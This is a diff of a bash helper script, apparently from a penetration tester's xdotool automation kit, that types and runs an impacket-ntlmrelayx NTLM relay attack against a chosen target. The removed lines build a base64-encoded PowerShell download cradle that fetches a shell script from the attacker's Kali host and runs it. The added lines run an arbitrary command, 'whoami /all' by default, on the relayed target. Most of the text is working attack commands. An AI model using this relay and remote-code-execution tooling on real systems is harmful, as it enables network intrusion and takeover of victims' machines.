@@ -1,17 +1,18 @@
 #!/bin/bash
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+: '
+impacket NTLM relayx attack
+'
 
-# Generate gui form
-generate_form "Download file path (tools/shell.sh)" "Relay target"
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+TARGET_IP_FIELD=$(form_item "target ip" "target_ip")
+CMD_FIELD=$(form_item "CMD" "cmd" "whoami /all")
 
-full_command="\$text = \"(New-Object System.Net.WebClient).DownloadString('http://${KALI_IP}/${form_data["Download file path (tools/shell.sh)"]}') | IEX\"; \$bytes = [System.Text.Encoding]::Unicode.GetBytes(\$text); \$EncodedText = [Convert]::ToBase64String(\$bytes); return \$EncodedText"
+# Generate GUI form
+generate_form "${TARGET_IP_FIELD}" "${CMD_FIELD}"
 
-ret_val=$(pwsh -c $full_command)
+TARGET_IP=${form_data["target_ip"]}
+CMD=${form_data["cmd"]}
 
-com="impacket-ntlmrelayx --no-http-server -smb2support -t ${form_data["Relay target"]} -c 'powershell -enc ${ret_val}'"
-
-paste_command --delay 10 "${com}"
+paste_command "impacket-ntlmrelayx --no-http-server -smb2support -t ${TARGET_IP} -c '${CMD}'"
 xdotool key Return
